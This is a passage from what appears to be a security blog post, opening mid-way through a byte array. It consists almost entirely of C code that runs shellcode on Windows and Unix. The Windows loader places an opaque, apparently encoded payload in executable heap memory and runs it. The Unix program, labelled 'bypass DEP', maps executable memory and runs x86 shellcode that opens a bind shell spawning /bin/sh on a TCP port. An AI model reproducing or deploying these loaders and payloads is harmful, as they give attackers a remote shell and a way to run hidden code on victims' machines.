"\x1b\x56\xad\xe9\x9e\x2c\x0e\xc8\x48\xbe\xad\x02\x44\xc4\x64"
"\x5b\x85\xe9\x87\x23\xef\xd8\x47\x27\x26\xf8\x2e\x50\xde\xf1"
"\x29\x6b\x68\x3b\xc1\x41\x65\xdc\x58\x14\x85\x1e\xc5\x20\xbf"
"\xe6\xd5\xb9\xbb\x44\x68\x3f\x77\x0f\x7c\xad\xe5\xc0\x73\x06"
"\xa0\x71\x1c\xb0\x7a\x25\x31\x9c\xe5\xaf\x01\x09\x0b\x2e\xf3"
"\x9a\x18\x50\xe8\x47\x03\x7f\x25\x32\x88\xdb\x3a\x2a\x93\x12"
"\xf8\x2a\xf4\x12\xf2\x23\xa6\x98\x67\xfd\xe7\xa2\xc8\x90\xc8"
"\x9c\x72\x80\xf7\xfe\x23\x54\x6c\xd8\x64\x4a\x23\x2e\x2a\x19"
"\x09\x95\x98\xa5\x14\x01\x33\x56\xee\xd5\x62\xac\x60\x4d\xe2"
"\x98\x3b\xaf\x86\x04\x79\x61\x91\xe6\x46\x1f\x0b\xc9\x66\x63"
"\x5d\x4f\x57\x3d\x8d\x96\x1a\x64\x34\xab\xe5\xa6\x39\xd7\x92"
"\x10\x05\x41\x0b\x0b\xef\x06\xf7\xfa\x28\x67\xc2\x44\x75\xd6"
"\xef\x4f\xa0\xa2\x93\x3d\xad\x20\xb6\x19\xc4\xfa\xd7\x0e\x6b"
"\x3a\x0e\xcc\x75\xf7\xa2\xf0\x6d\x09\xc0\xf1\x37\x12\x06\x2c"
"\xa9\x69\xf6\x3e\xc5\x2d\xea\x69\x42\x22\x60\x5b\x6b\xf2\x6f"
"\x61\xe9\x93\x19\xc1\x97\x9f\xe9\x45\x03\x1b\xe8\x3f\xaa\xe5"
"\xda\xc3\x8d\x89\xd4\x5d\xf0\x7c\xc4\x4d\x40\x20\xb2\xaa\x29"
"\x40\xfd\x67\xcf\x91\x18\xe5\xb4\x75\x21\x21\x89\x71\xa1\x9a"
"\x05\xd5\x39\x48\x2d\xcf\xa1\x29\x9e\xd5\x5e\x3c\xfb\xc6\x8b"
"\xc1\xaf\x1d\x9e\x4d\x46\x05\x94\x61\xbb\x28\xb2\xe9\xff\xe5"
"\xfd\x58\xfe\x3c\xc0\xd9\x47\xaf\x79\xf5\x39\x1d\xcc\x64\x89"
"\xbc\x5b\x87\xab\x36\x26\xd5\xd3\x18\x01\x2d\xd5\xd1\xe3\xb6"
"\x0e\x37\x52\x8c\x70\x12\x9e\x67\xd9\x22\xe7\xa4\xc3\x01\x4b"
"\x7c\x43\xf9\xc1\x28\xf4\x65\xef\xb1\x53\x89\x81\x33\x09\xdc"
"\xae\x27\xf5\xa6\x36\x1b\xf9\x2d\xb7\xaf\x6d\x62\x0c\x10\xf1"
"\xfc\x3e\x07\x84\xc9\x08\x18\x91\xbd\x50\x07\xbb\x76\xb8\x0f"
"\x2d\xcc\x18\x3c\xa4";

// call windows API 
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 LPSTR szCmdLine, int iCmdShow) {
typedef void (*fp)();
 /* alloc in heap the shellcode*/
 void * heap = (void *)VirtualAlloc(
 NULL,
 4096,
 MEM_COMMIT | MEM_RESERVE,
 PAGE_EXECUTE_READWRITE 
 );
// copy shellcode in memory alloc 
CopyMemory(heap, shellcode, sizeof shellcode);
fp func = (fp)heap;
 (*func)(); // execute shellcode
return 0;
}
#pragma section(".stub", execute, read, write)
#pragma code_seg(".stub")
#pragma section(".stubdata", read, write)
#pragma comment(linker,"/MERGE:.stubdata=.stub")
#pragma data_seg(".stubdata")
#pragma const_seg(".stubdata")
#pragma code_seg(".stub")
{% endhighlight  %}
<h3> Shellcode Unix Exec</h3>
{% highlight c++ %}
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
// bypass DEP Unix 
 // by: Mharcos Nesster
int (*sc)();
 
char shellcode[] = \
"\x31\xdb\xf7\xe3\xb0\x66\x53\xfe\xc3\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66\x58\x5b\x5e\x66\x68"
"\x0d\xf0"
"\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66\x58\x01\xdb\x6a\x01\x57\x89\xe1\xcd\x80\x6a"
"\x66\x58\x43\x31\xd2\x52\x52\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31"
"\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
int main(int argc, char **argv) {
 
    char *ptr = mmap(0, sizeof(shellcode),
            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = (int(*)())ptr;
 
    (void)((void(*)())ptr)();
    printf("\n");
 
    return 0;
}
{% endhighlight  %}
<p>Github: https://github.com/P0cL4bs/HeapExecShellcode</p>
<pre>
Referências:
https://samsclass.info/127/proj/rop.htm
http://www.intelligentexploit.com/articles/Return-Oriented-Programming-(ROP-FTW).pdf
http://phrack.org/issues/62/5.html
</pre>